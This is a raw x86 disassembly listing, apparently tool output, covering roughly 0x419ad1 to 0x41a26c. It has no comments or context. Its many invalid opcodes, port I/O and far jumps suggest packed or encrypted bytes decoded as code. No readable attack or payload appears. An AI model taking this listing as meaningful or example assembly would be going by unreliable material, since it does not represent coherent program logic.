  419ad1:	scas   al,BYTE PTR es:[edi]
  419ad2:	test   BYTE PTR [ebx],dl
  419ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad5:	ja     0x419b50
  419ad7:	and    eax,0x5e092cb0
  419adc:	inc    ebp
  419add:	dec    DWORD PTR [ebp+0xa]
  419ae0:	and    eax,0x7d21df06
  419ae5:	jmp    0x419af7
  419ae7:	or     esp,ebp
  419ae9:	cmovb  ecx,DWORD PTR [edx]
  419aec:	xor    DWORD PTR [edx+ecx*8+0x1b4e0a26],esp
  419af3:	sahf   
  419af4:	dec    ebp
  419af5:	and    eax,0x8ba79beb
  419afa:	push   0x245d51d
  419aff:	test   BYTE PTR [edx],bl
  419b01:	adc    BYTE PTR [edx-0x30f10369],0xb0
  419b08:	jbe    0x419afc
  419b0a:	jmp    0x419b04
  419b0c:	(bad)  
  419b0d:	push   esi
  419b0e:	pop    es
  419b0f:	leave  
  419b10:	jecxz  0x419b7d
  419b12:	call   0x31af68eb
  419b17:	mov    ah,0x67
  419b19:	inc    ecx
  419b1a:	mov    ebx,0x2130bb42
  419b1f:	adc    BYTE PTR [ebx],0x6a
  419b22:	inc    eax
  419b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b24:	(bad)  
  419b25:	shl    BYTE PTR [ebx-0x47],1
  419b28:	jle    0x419b65
  419b2a:	pop    es
  419b2b:	ret    0x9f6b
  419b2e:	ins    DWORD PTR es:[edi],dx
  419b2f:	das    
  419b30:	add    BYTE PTR [edx-0x42a1a0a5],0xf3
  419b37:	or     al,0xf8
  419b39:	dec    esi
  419b3a:	ret    0x5f90
  419b3d:	in     eax,dx
  419b3e:	mov    esi,ecx
  419b40:	mov    bl,0xd9
  419b42:	adc    al,0x43
  419b44:	ins    DWORD PTR es:[edi],dx
  419b45:	inc    esi
  419b46:	test   DWORD PTR [esi-0x70eeda82],esp
  419b4c:	(bad)  
  419b4d:	jo     0x419bc7
  419b4f:	rcr    BYTE PTR [eax+0x76],0x4b
  419b53:	(bad)
  419b56:	add    esi,DWORD PTR [eax+0x8a3ca02]
  419b5c:	std    
  419b5d:	jmp    0x419bda
  419b5f:	xchg   esp,eax
  419b60:	cwde   
  419b61:	into   
  419b62:	test   bl,dh
  419b64:	or     DWORD PTR [esi],0x6d
  419b67:	jl     0x419bd1
  419b69:	xor    eax,0x427a8593
  419b6e:	cwde   
  419b6f:	push   ss
  419b70:	mov    ebp,0x41ae1aa
  419b75:	xchg   esp,eax
  419b76:	sub    edi,edi
  419b78:	fwait
  419b79:	pop    esi
  419b7a:	adc    ch,al
  419b7c:	scas   eax,DWORD PTR es:[edi]
  419b7d:	fstp   st(3)
  419b7f:	inc    eax
  419b80:	mov    es,WORD PTR [edi-0x45]
  419b83:	mov    bh,BYTE PTR [ecx+esi*8-0x9b4af]
  419b8a:	pop    ss
  419b8b:	outs   dx,DWORD PTR ds:[esi]
  419b8c:	pop    esp
  419b8d:	mov    ebx,0xb977305e
  419b92:	and    BYTE PTR [edx+0x3170fc4a],dh
  419b98:	jno    0x419b4f
  419b9a:	push   ebp
  419b9b:	in     al,0x3e
  419b9d:	adc    edi,DWORD PTR [esi]
  419b9f:	jnp    0x419b8f
  419ba1:	jne    0x419b8f
  419ba3:	inc    ebx
  419ba4:	pop    ss
  419ba5:	jae    0x419b39
  419ba7:	push   edi
  419ba8:	add    DWORD PTR [ebx+eiz*4],0xffffffce
  419bac:	lds    ecx,FWORD PTR [ecx]
  419bae:	hlt    
  419baf:	ret    0x88de
  419bb2:	push   ecx
  419bb3:	scas   eax,DWORD PTR es:[edi]
  419bb4:	adc    ebx,DWORD PTR [edx-0x27a65ab4]
  419bba:	leave  
  419bbb:	in     eax,0x75
  419bbd:	jge    0x419bfb
  419bbf:	mov    dl,0x62
  419bc1:	out    0xfb,eax
  419bc3:	ins    DWORD PTR es:[edi],dx
  419bc4:	dec    esi
  419bc5:	jbe    0x419b54
  419bc7:	pop    edi
  419bc8:	in     al,dx
  419bc9:	or     BYTE PTR [edi],cl
  419bcb:	(bad)  
  419bcc:	xor    al,0x1d
  419bce:	outs   dx,BYTE PTR ds:[esi]
  419bcf:	outs   dx,DWORD PTR ds:[esi]
  419bd0:	out    dx,al
  419bd1:	shl    BYTE PTR [edx+esi*8],1
  419bd4:	repz dec ecx
  419bd6:	push   es
  419bd7:	mov    eax,ds:0x46652858
  419bdc:	sbb    eax,DWORD PTR [edi-0x4b8c4239]
  419be2:	xchg   bl,bh
  419be4:	sub    eax,0x87b6b74c
  419be9:	mov    eax,ds:0x18fba954
  419bee:	gs sub eax,0x7b542ed2
  419bf4:	xor    eax,0xd3b8750c
  419bf9:	sbb    esp,DWORD PTR [edi]
  419bfb:	pop    ecx
  419bfc:	pop    edx
  419bfd:	test   eax,0xc8b84922
  419c02:	imul   esp,DWORD PTR ss:[edx+0x56],0xb56c49f6
  419c0a:	cmc    
  419c0b:	sub    DWORD PTR ds:0xa804fdda,esp
  419c11:	pop    ds
  419c12:	ss jb  0x419bc1
  419c15:	sbb    ebp,esi
  419c17:	mov    al,0x80
  419c19:	or     ebx,edi
  419c1b:	les    eax,FWORD PTR [edi]
  419c1d:	mov    esp,0xbaf3407e
  419c22:	add    ebx,DWORD PTR [eax-0x25997d11]
  419c28:	ror    esi,1
  419c2a:	sbb    al,0x0
  419c2c:	test   DWORD PTR [ecx+0x7ed18e65],edx
  419c32:	mov    edi,0xe7991a0c
  419c37:	sbb    ch,BYTE PTR [edi+esi*2]
  419c3a:	ja     0x419c46
  419c3c:	sbb    eax,0x438db63d
  419c41:	out    0xc8,al
  419c43:	xor    al,0xc2
  419c45:	mov    ebp,0xe8d0dc72
  419c4a:	pop    eax
  419c4b:	test   BYTE PTR [esi],cl
  419c4d:	cmp    ch,al
  419c4f:	adc    ebp,DWORD PTR [edx-0x2cdbb3fd]
  419c55:	sbb    al,0x3c
  419c57:	jle    0x419c0c
  419c59:	mov    bh,0x8a
  419c5b:	sahf   
  419c5c:	push   ecx
  419c5d:	mov    dh,BYTE PTR [esp+eax*4+0xc]
  419c61:	arpl   WORD PTR [ebx],di
  419c63:	aas    
  419c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c65:	xchg   ebp,eax
  419c66:	jp     0x419c29
  419c68:	addr16 inc esi
  419c6a:	mov    ch,0xc0
  419c6c:	fnsave [ecx-0x437e9f2a]
  419c72:	pop    ebp
  419c73:	push   ss
  419c74:	dec    ecx
  419c75:	cmp    edi,DWORD PTR [edx]
  419c77:	inc    eax
  419c78:	clc    
  419c79:	lea    ebx,[ebx+0x28f1dda]
  419c7f:	mov    esp,0x9c1fac12
  419c84:	jbe    0x419c8d
  419c86:	inc    ebp
  419c87:	mov    cl,0x2a
  419c89:	das    
  419c8a:	fnstsw WORD PTR [ecx+0x6266593]
  419c90:	cli    
  419c91:	fimul  DWORD PTR [ebx+0x6ed4d92c]
  419c97:	rol    esi,1
  419c99:	popf   
  419c9a:	and    ebp,DWORD PTR [esi-0x19]
  419c9d:	stos   BYTE PTR es:[edi],al
  419c9e:	cmp    edi,DWORD PTR [edi]
  419ca0:	xor    eax,0x5f9818a9
  419ca5:	sahf   
  419ca6:	fistp  DWORD PTR [ebp+0x47]
  419ca9:	cwde   
  419caa:	scas   al,BYTE PTR es:[edi]
  419cab:	inc    ebp
  419cac:	out    dx,eax
  419cad:	adc    BYTE PTR [edi+0x6931d062],dl
  419cb3:	out    0x16,eax
  419cb5:	xchg   edx,eax
  419cb6:	lds    esi,FWORD PTR [esi+0x4]
  419cb9:	ds (bad) 
  419cbb:	in     al,dx
  419cbc:	sub    al,ch
  419cbe:	xchg   DWORD PTR [ebp+0x4396cd87],eax
  419cc4:	mov    ecx,0xf66ac3fe
  419cc9:	out    dx,al
  419cca:	imul   esi,DWORD PTR [esi],0x49ad095c
  419cd0:	into   
  419cd1:	jne    0x419cca
  419cd3:	push   ecx
  419cd4:	cdq    
  419cd5:	xchg   esp,eax
  419cd6:	outs   dx,DWORD PTR ds:[esi]
  419cd7:	jg     0x419c63
  419cd9:	outs   dx,BYTE PTR ds:[esi]
  419cda:	adc    eax,DWORD PTR [eax]
  419cdc:	fs loope 0x419ccd
  419cdf:	mov    DWORD PTR [ebp+0x72a99c65],ebp
  419ce5:	add    dl,BYTE PTR [eax+0x870ba1f]
  419ceb:	(bad)  
  419cec:	cld    
  419ced:	jge    0x419d21
  419cef:	fwait
  419cf0:	imul   ebp,DWORD PTR [esi-0x58],0xffffff84
  419cf4:	xchg   BYTE PTR [ecx-0x6006739a],bl
  419cfa:	es ins DWORD PTR es:[edi],dx
  419cfc:	out    dx,eax
  419cfd:	aam    0xad
  419cff:	mov    al,0x2b
  419d01:	pop    eax
  419d02:	(bad)  
  419d03:	pop    ebx
  419d04:	cmp    BYTE PTR [ecx],ch
  419d06:	fdiv   QWORD PTR [ebp+0x5ec438c]
  419d0c:	adc    al,0xc7
  419d0e:	sahf   
  419d0f:	retf   
  419d10:	push   eax
  419d11:	test   eax,0xeae2e379
  419d16:	fisttp QWORD PTR [esi-0x67]
  419d19:	pop    ss
  419d1a:	das    
  419d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d1c:	lods   al,BYTE PTR ds:[esi]
  419d1d:	dec    edx
  419d1e:	add    DWORD PTR [eax-0x2d],ebx
  419d21:	in     al,0x7d
  419d23:	and    DWORD PTR [ebx-0x3dd72b4e],esi
  419d29:	mov    edx,0x269225e5
  419d2e:	dec    edi
  419d2f:	cld    
  419d30:	popf   
  419d31:	jecxz  0x419d25
  419d33:	jns    0x419d7e
  419d35:	inc    esp
  419d36:	ret    
  419d37:	ds es jbe 0x419cfa
  419d3b:	pushf  
  419d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d3d:	imul   ebp,DWORD PTR [esi+ecx*2+0x17],0x42f225d1
  419d45:	add    edi,DWORD PTR [ecx+0x4b]
  419d48:	mov    esi,0x3e4e8575
  419d4d:	int3   
  419d4e:	add    bh,0x59
  419d51:	and    DWORD PTR [eax+0x6e],edx
  419d54:	popa   
  419d55:	push   esp
  419d56:	sub    ebp,DWORD PTR [ebp-0x30b52a2d]
  419d5c:	dec    eax
  419d5d:	test   DWORD PTR [eax],0xc72205fc
  419d63:	and    DWORD PTR [esi],esp
  419d65:	call   0x19b0:0xea469aa4
  419d6c:	jns    0x419da7
  419d6e:	in     al,0x55
  419d70:	icebp  
  419d71:	sar    BYTE PTR [ebx-0x33],cl
  419d74:	add    DWORD PTR [eax],edx
  419d76:	adc    eax,0x5048de52
  419d7b:	sbb    esp,ebp
  419d7d:	cli    
  419d7e:	loopne 0x419dd1
  419d80:	add    eax,0xbea6aa80
  419d85:	xchg   esp,eax
  419d86:	add    DWORD PTR [edx],ebx
  419d88:	pop    esi
  419d89:	jmp    0x85d0:0x143f0238
  419d90:	mov    ebx,esi
  419d92:	jl     0x419dd6
  419d94:	retf   0xf23e
  419d97:	shr    BYTE PTR [ebx-0x7b],1
  419d9a:	xchg   DWORD PTR [eax-0x49],esp
  419d9d:	test   al,0x59
  419d9f:	leave  
  419da0:	jne    0x419d8c
  419da2:	das    
  419da3:	ds inc eax
  419da5:	push   edi
  419da6:	mov    DWORD PTR [eax],ebx
  419da8:	lea    esp,[ecx+0x7f]
  419dab:	jae    0x419d43
  419dad:	push   ss
  419dae:	jge    0x419da7
  419db0:	cmp    BYTE PTR [esi-0x1c2cee1d],dl
  419db6:	gs mov edx,0xd509ebb8
  419dbc:	add    BYTE PTR [edi-0x15ec0b0b],0x9f
  419dc3:	cmp    eax,0xa6461817
  419dc8:	mov    ebp,0xf0a8fef0
  419dcd:	pop    esi
  419dce:	mov    ds:0xa038b9b8,eax
  419dd3:	pop    eax
  419dd4:	inc    esp
  419dd5:	pop    ss
  419dd6:	and    al,0x18
  419dd8:	jbe    0x419d64
  419dda:	leave  
  419ddb:	xchg   ecx,eax
  419ddc:	push   esi
  419ddd:	inc    ecx
  419dde:	in     eax,dx
  419ddf:	shr    DWORD PTR [eax+edx*1-0x32],0x99
  419de4:	pop    ss
  419de5:	(bad)  
  419de6:	aad    0x8e
  419de8:	in     al,dx
  419de9:	mov    WORD PTR [eax],?
  419deb:	gs sbb eax,0x96f10061
  419df1:	xchg   bh,bl
  419df3:	push   0xffffff98
  419df5:	outs   dx,DWORD PTR ds:[esi]
  419df6:	inc    edi
  419df7:	add    BYTE PTR [edi-0x9],0x21
  419dfb:	clc    
  419dfc:	dec    ecx
  419dfd:	sti    
  419dfe:	pop    ebx
  419dff:	dec    ecx
  419e00:	mov    al,0xea
  419e02:	hlt    
  419e03:	mov    bl,BYTE PTR [edi-0x7abe3920]
  419e09:	add    eax,0x2b390035
  419e0e:	lock cld 
  419e10:	mov    dh,0x8b
  419e12:	push   edx
  419e13:	and    al,0x7f
  419e15:	leave  
  419e16:	or     cl,cl
  419e18:	sar    DWORD PTR [eax-0x42314166],1
  419e1e:	sub    al,BYTE PTR [ecx]
  419e20:	cmc    
  419e21:	loope  0x419e9b
  419e23:	pop    ebp
  419e24:	fidivr DWORD PTR [esi+edi*1-0x738e5a7f]
  419e2b:	mov    bh,0x63
  419e2d:	shl    dl,cl
  419e2f:	out    dx,eax
  419e30:	cmc    
  419e31:	cli    
  419e32:	sub    al,0x72
  419e34:	sub    ebx,DWORD PTR [edx-0x3acc1224]
  419e3a:	mov    esp,0x779493f
  419e3f:	pop    ebx
  419e40:	or     BYTE PTR [ecx-0x25a29759],0x15
  419e47:	add    eax,0x334d4e12
  419e4c:	retf   0x7f1a
  419e4f:	jl     0x419eae
  419e51:	ficom  WORD PTR [ebp+0x860d22e]
  419e57:	jb     0x419ed3
  419e59:	mov    ecx,0x85e75e76
  419e5e:	mov    ?,WORD PTR [eax]
  419e60:	shl    DWORD PTR [eax+0x4fc1dc6a],1
  419e66:	lock cdq 
  419e68:	and    eax,ecx
  419e6a:	leave  
  419e6b:	inc    esi
  419e6c:	sub    ecx,DWORD PTR [ebp-0x27]
  419e6f:	xor    eax,0x96fa9256
  419e74:	ins    DWORD PTR es:[edi],dx
  419e75:	cli    
  419e76:	outs   dx,DWORD PTR ds:[esi]
  419e77:	or     edi,DWORD PTR [ecx+0x1159b8a0]
  419e7d:	out    dx,eax
  419e7e:	pop    edi
  419e7f:	pop    es
  419e80:	jle    0x419e63
  419e82:	stos   BYTE PTR es:[edi],al
  419e83:	lea    esp,[esi+0x47083cf6]
  419e89:	ss cmc 
  419e8b:	mov    al,ds:0xc42e92de
  419e90:	loopne 0x419ebc
  419e92:	adc    al,0xf3
  419e94:	sub    DWORD PTR [edx],0x1f
  419e97:	popa   
  419e98:	jno    0x419e3c
  419e9a:	(bad)  [esi-0x27421b0d]
  419ea0:	jnp    0x419eff
  419ea2:	mov    bl,0xe5
  419ea4:	rcr    BYTE PTR [ecx+0x6c],cl
  419ea7:	leave  
  419ea8:	ret    0x8194
  419eab:	repnz adc DWORD PTR [ecx],0xfffffff8
  419eaf:	cmp    ebx,edx
  419eb1:	and    BYTE PTR [eax],al
  419eb3:	lods   eax,DWORD PTR ds:[esi]
  419eb4:	mov    BYTE PTR [ebx+0xb],ah
  419eb7:	fistp  QWORD PTR [edi+0x4285daeb]
  419ebd:	cmp    DWORD PTR [edi+0x4a],esi
  419ec0:	mov    eax,0x9d2617d5
  419ec5:	cli    
  419ec6:	lock dec ebx
  419ec8:	or     al,0xbe
  419eca:	test   cl,bh
  419ecc:	and    cl,ch
  419ece:	ins    BYTE PTR es:[edi],dx
  419ecf:	enter  0x97ca,0x94
  419ed3:	jb     0x419eb0
  419ed5:	das    
  419ed6:	scas   eax,DWORD PTR es:[edi]
  419ed7:	call   0x3fdd:0x366f4e36
  419ede:	aad    0x83
  419ee0:	fisub  DWORD PTR [edi-0x6d]
  419ee3:	ss lock nop edi
  419ee8:	inc    edi
  419ee9:	into   
  419eea:	adc    DWORD PTR [ebp+0x1c8a3b6c],edi
  419ef0:	mov    bl,0x37
  419ef2:	xor    DWORD PTR [eax-0x67],eax
  419ef5:	shl    DWORD PTR [ebp+eiz*8-0xa],cl
  419ef9:	mov    ecx,0x3f68073a
  419efe:	and    eax,0x18c5c28b
  419f03:	push   edi
  419f04:	jae    0x419ecb
  419f06:	dec    ebx
  419f07:	arpl   WORD PTR [ebx+0x1c],si
  419f0a:	mov    DWORD PTR [ebx-0x737d4123],esi
  419f10:	scas   al,BYTE PTR es:[edi]
  419f11:	cmp    ebx,ebx
  419f13:	mov    ds:0x709a22ff,al
  419f18:	and    al,0xcd
  419f1a:	pop    edi
  419f1b:	push   ecx
  419f1c:	mov    esp,0xa8de15b6
  419f21:	test   DWORD PTR [ecx-0x78],esi
  419f24:	icebp  
  419f25:	enter  0xd5da,0xc4
  419f29:	fs xchg edi,eax
  419f2b:	js     0x419efe
  419f2d:	push   es
  419f2e:	gs nop
  419f30:	jp     0x419f57
  419f32:	push   edi
  419f33:	iret   
  419f34:	add    eax,ebx
  419f36:	ins    BYTE PTR es:[edi],dx
  419f37:	stc    
  419f38:	inc    ecx
  419f39:	pop    esp
  419f3a:	jge    0x419ed5
  419f3c:	pop    ds
  419f3d:	pop    ebp
  419f3e:	or     al,0xde
  419f40:	outs   dx,BYTE PTR ds:[esi]
  419f41:	leave  
  419f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f43:	mov    ds:0x6a6a5e6f,al
  419f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f49:	add    DWORD PTR [eax+0x11c97577],edi
  419f4f:	dec    ebp
  419f50:	sbb    edi,edi
  419f52:	cmp    DWORD PTR [edi+0x59a1dea1],ebx
  419f58:	xchg   DWORD PTR [ebx],eax
  419f5a:	stc    
  419f5b:	call   0xf47:0xc4c65f77
  419f62:	out    0x77,al
  419f64:	inc    edx
  419f65:	adc    eax,0x263872bc
  419f6a:	push   ebp
  419f6b:	popa   
  419f6c:	nop
  419f6d:	inc    edx
  419f6e:	and    ah,BYTE PTR [edi]
  419f70:	push   ebx
  419f71:	in     eax,dx
  419f72:	mov    eax,0x1dbc01f0
  419f77:	out    0x87,eax
  419f79:	push   cs
  419f7a:	mov    edx,0xc824ddc3
  419f7f:	mov    ds:0x3cfa1e1c,eax
  419f84:	cpuid  
  419f86:	dec    ecx
  419f87:	ror    BYTE PTR ds:0x3ece9770,1
  419f8d:	out    0xe7,eax
  419f8f:	(bad)  
  419f90:	shr    esp,1
  419f92:	fmul   QWORD PTR [esi-0x7e]
  419f95:	les    edi,FWORD PTR [esi-0x5]
  419f98:	ja     0x419f4f
  419f9a:	cmp    al,BYTE PTR ds:0x6fa6d0dd
  419fa0:	mov    edi,0x8b9f69d9
  419fa5:	ins    BYTE PTR es:[edi],dx
  419fa6:	fnstcw WORD PTR ss:[ecx-0x7d]
  419faa:	sbb    eax,0xeb9b976
  419faf:	jnp    0x419f88
  419fb1:	cli    
  419fb2:	mov    dl,cl
  419fb4:	imul   edi,DWORD PTR [edi+0x57072ee2],0xd6efb2bf
  419fbe:	sub    BYTE PTR [edi+0x17c650d2],bh
  419fc4:	iret   
  419fc5:	popa   
  419fc6:	xchg   ebx,eax
  419fc7:	mov    edx,ecx
  419fc9:	inc    ecx
  419fca:	stos   DWORD PTR es:[edi],eax
  419fcb:	daa    
  419fcc:	jns    0x419fd4
  419fce:	(bad)  
  419fcf:	cmp    DWORD PTR [eax-0x73ec02a7],ebx
  419fd5:	scas   eax,DWORD PTR es:[edi]
  419fd6:	iret   
  419fd7:	mov    esi,0xe8ecc22d
  419fdc:	gs daa 
  419fde:	pop    es
  419fdf:	stos   DWORD PTR es:[edi],eax
  419fe0:	jl     0x419fe3
  419fe2:	pop    ecx
  419fe3:	test   DWORD PTR [ebx],esp
  419fe5:	ffreep st(6)
  419fe7:	push   esp
  419fe8:	sub    DWORD PTR [edi],0x545cdf2b
  419fee:	shr    BYTE PTR [eax+0x1e],cl
  419ff1:	rcr    BYTE PTR [edx],0x81
  419ff4:	cmp    edi,DWORD PTR [edi]
  419ff6:	push   ds
  419ff7:	(bad)  
  419ffa:	mov    ecx,0xb5976998
  419fff:	out    0xa8,eax
  41a001:	xchg   esp,eax
  41a002:	sti    
  41a003:	mov    bl,0x68
  41a005:	test   BYTE PTR [eax+0x25d62b4a],cl
  41a00b:	and    DWORD PTR [eax+ebp*2+0x7d],esp
  41a00f:	jno    0x419fb9
  41a011:	loopne 0x419fd1
  41a013:	lea    edx,[eax+0x1e3fdb3a]
  41a019:	pop    esi
  41a01a:	adc    esi,DWORD PTR [ebx-0x490712a4]
  41a020:	add    al,0x7b
  41a022:	jo     0x41a09f
  41a024:	imul   edx,DWORD PTR [esi+edi*4],0x6e0f8b54
  41a02b:	push   ss
  41a02c:	mov    ds:0x78ab0f9b,al
  41a031:	loop   0x419fc4
  41a033:	fdiv   QWORD PTR [ecx-0x4a7f6784]
  41a039:	xchg   BYTE PTR [ebx+ebp*4-0x40d280eb],ah
  41a040:	cmc    
  41a041:	mov    al,0x33
  41a043:	ins    DWORD PTR es:[edi],dx
  41a044:	cli    
  41a045:	push   eax
  41a046:	retf   
  41a047:	xchg   ecx,eax
  41a048:	mov    ebp,0x39cc87c0
  41a04d:	or     dl,cl
  41a04f:	cli    
  41a050:	sub    al,0xbf
  41a052:	icebp  
  41a053:	in     eax,dx
  41a054:	inc    ebx
  41a055:	cmp    DWORD PTR [ecx],0xffffff88
  41a058:	fwait
  41a059:	adc    bh,al
  41a05b:	sbb    DWORD PTR [eax+ebx*1+0x14047019],ebp
  41a062:	mov    edi,0xf5457198
  41a067:	xchg   edi,eax
  41a068:	sbb    al,0xd4
  41a06a:	hlt    
  41a06b:	jmp    0x1a06:0x16ce0f11
  41a072:	cld    
  41a073:	test   DWORD PTR [eax],ebp
  41a075:	fdivr  DWORD PTR [edi+0x816a86d]
  41a07b:	and    al,0xa4
  41a07d:	pop    edx
  41a07e:	cmp    cl,BYTE PTR [eax+0x7b]
  41a081:	adc    al,BYTE PTR [eax]
  41a083:	pop    ebx
  41a084:	call   0xd4ed:0x8d37f920
  41a08b:	inc    eax
  41a08c:	adc    al,0xb6
  41a08e:	jecxz  0x41a0c6
  41a090:	adc    BYTE PTR [edx-0x7817173f],ch
  41a096:	push   esi
  41a097:	jmp    DWORD PTR [eax+0x4d]
  41a09a:	cs js  0x41a08c
  41a09d:	push   ebp
  41a09e:	or     dl,BYTE PTR [eax+ebp*1-0x20]
  41a0a2:	aad    0x21
  41a0a4:	js     0x41a05d
  41a0a6:	js     0x41a079
  41a0a8:	push   eax
  41a0a9:	or     al,0x97
  41a0ab:	ss fstp QWORD PTR ss:[edx-0xa]
  41a0b0:	(bad)  
  41a0b1:	sar    BYTE PTR [esi+0x55],1
  41a0b4:	jnp    0x41a0c0
  41a0b6:	push   edx
  41a0b7:	dec    ebx
  41a0b8:	cmp    al,BYTE PTR [ecx+0x5378dc4f]
  41a0be:	ja     0x41a0a7
  41a0c0:	inc    ebp
  41a0c1:	jl     0x41a120
  41a0c3:	or     eax,0x65546ca
  41a0c8:	inc    edi
  41a0c9:	test   al,0x2
  41a0cb:	rcl    BYTE PTR [edi+0x6c9de74b],1
  41a0d1:	push   ds
  41a0d2:	test   al,0x96
  41a0d4:	push   esi
  41a0d5:	cmp    esp,DWORD PTR ds:0x949522a5
  41a0db:	jno    0x41a108
  41a0dd:	outs   dx,BYTE PTR ds:[esi]
  41a0de:	ror    al,1
  41a0e0:	aas    
  41a0e1:	popa   
  41a0e2:	sbb    eax,0x44fbb5e
  41a0e7:	clc    
  41a0e8:	(bad)  
  41a0e9:	sub    eax,0xe3df8808
  41a0ee:	rol    BYTE PTR [esi+0x7b639d77],cl
  41a0f4:	int3   
  41a0f5:	jmp    0xb264:0x66fd8d67
  41a0fc:	sub    edx,0x52f33ac2
  41a102:	dec    ebx
  41a103:	sti    
  41a104:	mov    ecx,0x13cd1906
  41a109:	jecxz  0x41a10e
  41a10b:	out    dx,al
  41a10c:	std    
  41a10d:	cmp    esi,DWORD PTR [edi]
  41a10f:	and    DWORD PTR [ecx-0x50f5bf30],edi
  41a115:	pop    edx
  41a117:	xor    eax,0xe8b4d921
  41a11c:	enter  0xa6f4,0x25
  41a120:	xor    ch,bh
  41a122:	mov    DWORD PTR [eax],0x7a410109
  41a128:	sub    DWORD PTR [eax-0x5e],ebx
  41a12b:	push   edx
  41a12c:	mov    al,ds:0x658c2d87
  41a131:	xlat   BYTE PTR ds:[ebx]
  41a132:	fnstsw WORD PTR [ebp-0x4f]
  41a135:	jbe    0x41a0f4
  41a137:	sbb    al,0x9a
  41a139:	dec    eax
  41a13a:	bound  esi,QWORD PTR [ebx+0x12d769f]
  41a140:	push   ds
  41a141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a142:	mov    ebx,?
  41a144:	popf   
  41a145:	fstp   TBYTE PTR [esi+0x5f]
  41a148:	hlt    
  41a149:	stos   BYTE PTR es:[edi],al
  41a14a:	dec    ecx
  41a14b:	mov    ebp,0x6d361928
  41a150:	or     BYTE PTR [ebx-0x2eb6229b],bh
  41a156:	inc    ebx
  41a157:	xchg   ebp,eax
  41a158:	das    
  41a159:	data16 js 0x41a1cd
  41a15c:	in     eax,dx
  41a15d:	push   ss
  41a15e:	mov    esi,0x2d8ef240
  41a163:	pop    ss
  41a164:	and    bh,BYTE PTR [eax]
  41a166:	sub    al,0x86
  41a168:	mov    DWORD PTR [ecx],edi
  41a16a:	punpckldq mm7,DWORD PTR [esi+0x6]
  41a16e:	out    dx,eax
  41a16f:	mov    DWORD PTR [eax+0x57c5df7b],ebp
  41a175:	out    dx,al
  41a176:	adc    eax,0x779c6702
  41a17b:	jno    0x41a1c4
  41a17d:	dec    ebp
  41a17e:	jle    0x41a156
  41a180:	adc    ebx,DWORD PTR [ecx+ebx*4-0x3f]
  41a184:	cmp    DWORD PTR [edx],eax
  41a186:	je     0x41a1c3
  41a188:	xor    ebx,DWORD PTR [ebp-0x74f388e9]
  41a18e:	iret   
  41a18f:	adc    al,0x47
  41a191:	fs stc 
  41a193:	loopne 0x41a15a
  41a195:	out    dx,al
  41a196:	popa   
  41a197:	jp     0x41a188
  41a199:	int3   
  41a19a:	dec    ecx
  41a19b:	or     ch,BYTE PTR [esi+0x3e]
  41a19e:	jle    0x41a1f1
  41a1a0:	mov    ebp,0x43b1b543
  41a1a5:	inc    ecx
  41a1a6:	sbb    al,0xbb
  41a1a8:	jns    0x41a1d5
  41a1aa:	xchg   esp,eax
  41a1ab:	pop    ds
  41a1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ad:	jge    0x41a169
  41a1af:	sahf   
  41a1b0:	sbb    ebp,edx
  41a1b2:	fstp   st(5)
  41a1b4:	nop
  41a1b5:	xor    edx,edi
  41a1b7:	shr    DWORD PTR [esi+0x75],1
  41a1ba:	adc    DWORD PTR [ebx],ebp
  41a1bc:	xlat   BYTE PTR ds:[ebx]
  41a1bd:	imul   ebp,DWORD PTR [eax],0xffffffa7
  41a1c0:	jp     0x41a1ed
  41a1c2:	mov    ds:0x104968b7,al
  41a1c7:	pop    esp
  41a1c8:	sbb    al,0x81
  41a1ca:	nop
  41a1cb:	lahf   
  41a1cc:	pop    edx
  41a1cd:	mov    eax,ds:0xb1f39691
  41a1d2:	ins    DWORD PTR es:[edi],dx
  41a1d3:	xchg   DWORD PTR [ecx-0x4],ecx
  41a1d6:	or     bl,cl
  41a1d8:	rcr    ecx,cl
  41a1da:	retf   
  41a1db:	or     BYTE PTR ds:0x1dee1b68,al
  41a1e1:	adc    al,0x23
  41a1e3:	cli    
  41a1e4:	and    edi,ecx
  41a1e6:	sub    al,0x3c
  41a1e8:	loopne 0x41a202
  41a1ea:	adc    al,0xc1
  41a1ec:	xchg   edi,eax
  41a1ed:	sub    BYTE PTR [ecx+0x29],cl
  41a1f0:	jmp    0x973d2442
  41a1f5:	lock sbb DWORD PTR [esi+edi*8+0x73ae5ee2],edi
  41a1fd:	mov    eax,ds:0x9a885ef6
  41a202:	mov    edi,0xb7ac1bd
  41a207:	test   BYTE PTR [edi-0x23bacf07],dh
  41a20d:	clc    
  41a20e:	sbb    ecx,ebp
  41a210:	ss jo  0x41a1de
  41a213:	sub    edi,DWORD PTR [ecx+0x26]
  41a216:	or     bh,BYTE PTR ds:0x959ee143
  41a21c:	leave  
  41a21d:	sahf   
  41a21e:	pop    esi
  41a21f:	stos   BYTE PTR es:[edi],al
  41a220:	call   0xb3519eaf
  41a225:	out    dx,al
  41a226:	shr    BYTE PTR [ebp+edx*8-0x1bca810e],1
  41a22d:	pushf  
  41a22e:	sar    ch,1
  41a230:	mov    ebp,0x6c85a5d
  41a235:	xchg   esi,eax
  41a236:	and    BYTE PTR [edi+0x2a],ch
  41a239:	mov    ds:0x852d0733,eax
  41a23e:	rcl    DWORD PTR [eax-0x6c2bf113],1
  41a244:	sub    DWORD PTR [edi-0x5c],0x67
  41a248:	fcmovu st,st(4)
  41a24a:	stc    
  41a24b:	repnz mov cl,0x9e
  41a24e:	imul   esp,DWORD PTR [edx],0xffffffc7
  41a251:	push   esp
  41a252:	out    dx,al
  41a253:	mov    bh,0x59
  41a255:	mov    al,0x32
  41a257:	es pop ebx
  41a259:	or     edx,edi
  41a25b:	test   al,0x43
  41a25d:	dec    esi
  41a25e:	ficomp DWORD PTR [ebx+0xf]
  41a261:	sahf   
  41a262:	outs   dx,BYTE PTR ds:[esi]
  41a263:	pop    ecx
  41a264:	stos   BYTE PTR es:[edi],al
  41a265:	add    DWORD PTR [ebx],ebp
  41a267:	jmp    0x41a22c
  41a269:	or     DWORD PTR [esi-0x33],ecx
  41a26c:	xchg   ecx,eax
